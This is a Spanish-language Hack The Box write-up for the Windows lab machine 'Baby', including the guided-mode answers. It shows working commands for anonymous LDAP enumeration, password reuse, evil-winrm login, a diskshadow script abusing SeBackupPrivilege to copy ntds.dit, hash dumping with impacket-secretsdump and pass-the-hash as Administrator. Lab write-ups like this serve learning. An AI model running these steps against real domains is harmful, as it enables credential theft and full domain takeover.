---
title: Writeup baby - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - baby
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina baby en Hack The Box.
keywords:
  - writeup baby
  - hack the box baby
  - resolución máquina baby
  - baby hack the box
  - htb baby
---
--------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Windows/Baby)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=Usq5mILINJs)|[Parte2](https://www.youtube.com/watch?v=4huQQ84NGUM)|[Parte3](https://www.youtube.com/watch?v=XSfmFRoq_FA)|[Parte4](https://www.youtube.com/watch?v=ef46UQ4P6uM)|[Parte5](https://www.youtube.com/watch?v=5kadobjPP_g)
- 🧠 **Explicación resumida**: 

---

#nmap #ping #easy #windows #netexec #startlab #nvim #/etc/hosts #evil-winrm #ntdsdit #diskshadow #impacket-secretsdump #mkdir #cd #ldap #smb

-----
# Guided Mode

1)¿Cuál es el nombre de dominio completo de Baby?
	BabyDC.baby.vl

2)¿Qué usuario tiene una contraseña expuesta en su campo de descripción LDAP?
	Teresa.Bell

3)¿Qué cuenta de usuario debe restablecer su contraseña caducada antes de iniciar sesión?
	Caroline.Robinson

*La pregunta anterior es la flag de user.txt*
5)¿Qué privilegio peligroso tiene el usuario Caroline.Robinson asociado a su cuenta?
	SeBackupPrivilege

6)¿Qué archivo contiene los hash cifrados del dominio de usuario?
	NTDS.dit

7)¿Cuál es el hash de dominio del usuario 
	ee4457ae59f1e3fbd764e33d9cef123d
	
-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

Se puede utilizar la version automatizada que tenemos creada con [[startlab]] o si no de forma manual con los siguientes comandos

```shell
ping -c 1 IP
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn IP -oG allPortsTCP
extractPorts allPortsTCP
nmap -sCV -pPuertos IP -oN targetTCP
nmap -sU -n -Pn --top-ports 200 IP -oG allPortsUDP
extractPorts allPortsUDP
nmap -sU -sCV -pPuertos IP -oN targetUDP
```

![[Baby1.png]]

![[Baby2.png]]
![[Baby3.png]]

![[Baby4.png]]
*TTL:* Maquina Windows
*Puertos relevantes TCP:*
	`389` LDAP
	`445` [[smb]]
	`5985`[[evil-winrm]]
	
*Puertos UDP:*
	Mucho ruido, nada importante

*Datos relevantes:*
	Nos da el dominio baby.vl

-------
# Agregamos dominio al /etc/hosts
Usamos [[nvim]] con el comando `nvim /etc/hosts` para abrir el archivo

![[Baby5.png]]
![[Baby6.png]]
```
10.129.110.102 baby.vl
```

------
# Conseguimos credenciales del usuario Caroline.Robinson con [[netexec]]

Con [[netexec]] vamos a usar `netexec ldap baby.vl -u''-p'' --users` para enumerar todos los usuarios, y vemos que el de Teresa.Bell tiene una descripcion que nos indica una posible contraseña

![[Baby9.png]]
Teresa.Bell:BabyStart123!

Ahora utilizamos la query de objectclass para enumerar todos los objetos y encontramos a Caroline Robinson que no nos aparece en usuario, asi que vamos a probar las siguientes credenciales
`netexec ldap baby.vl -u''-p'' --query "(objectClass=*)" ""`
![[Baby11.png]]
Caroline.Robinson:BabyStart123!


Nos intentamos conectar con smb para verificar si sirven las credenciales y nos da el error de que tenemos que cambiar la contraseña
``netexec smb baby.vl -u 'Caroline.Robinson' -p 'BabyStart123!'``

![[Baby10.png]]

Buscando en internet encontramos este [articulo](https://www.netexec.wiki/smb-protocol/change-user-password) donde nos dice como cambiar la contraseña 

``netexec smb baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS=pawnedexploit123.``
![[Baby12.png]]
Una vez cambiada la contraseña nos vamos a conectar con [[evil-winrm]]

``evil-winrm -i baby.vl -u "Caroline.Robinson" -p "pawnedexploit123." -P 5985``

![[Baby19.png]]
![[Baby13.png]]
Ya estamos adentro y tenemos la primera flag de user.txt


----
# Escalada de privilegios con [[diskshadow ntds.dit]]

Usamos el comando [[whoami]] con `whoami /all`
Vemos que tenemos los permisos de SeBackupPrivilege + SeRestorePrivilege


Con [[nvim]] vamos crear un archivo con el siguiente contenido y lo vamos a poner en un archivo que se llama exploit.txt

```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```

Ahora con [[unix2dos]] usando `unix2dos exploit.txt` para que reconozca bien los finales de linea y lea todo el contenido, ya que cuando lo ejecutaba sin pasarle el unix2dos no me detectaba todo el codigo
![[Baby24.png]]
Vamos a subir el archivo *exploit.txt* usando el comando `upload exploit.txt` que tiene [[evil-winrm]]
Con el comando `diskshadow /s exploit.txt` vamos a ejecutar las instrucciones tenemos en el exploit.txt
![[Baby25.png]]
Ya se nos creo una nueva particion que es la *z* donde esta el archivo *ntds.dit* ubicado en *z:/Windows/ntds/ntds.dit*


En la particion de *C:* cree una carpeta con [[mkdir]] usando el comando `mkdir tmp` que se llama tmp para trabajar en ese directorio mas comodamente. y con [[cd]] usamos ``cd C:/tmp`` ya nos vamos a quedar en el directorio
Con la herramienta [[robocopy]] vamos a usar el comando `robocopy /B z:\Windows\NTDS . ntds.dit` para copiar el archivo ntds.dit al directorio actual de trabajo que en este caso es la carpeta tmp


![[Baby28.png]]

![[Baby29.png]]
con `download ntds.dit` vamos a descargar el archivo a nuestra maquina de atacante

Vamos a usar `reg save hklm\system c:\tmp\system` para guardar un archivo de la rama del registro de windows
![[Baby27.png]]
Y despues con `download system` vamos a descargar el archivo a nuestra maquina de ata cante
# Con [[impacket-secretsdump]] vamos a dumpear el hash del usuario administrator

```
sudo impacket-secretsdump -system system -ntds ntds.dit LOCAL
```

![[Baby32.png]]
Obtenemos las credenciales administrator:ee4457ae59f1e3fbd764e33d9cef123d

Ahora con [[evil-winrm]] nos vamos a conectar 
``evil-winrm -i baby.vl -u "Administrator" -H "ee4457ae59f1e3fbd764e33d9cef123d" -P 5985``
![[Baby30.png]]
Ya podemos catear la flag


---------
# Creditos

[Writeup de la maquina blackfield de 0xdf](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es) para hacer el diskshadow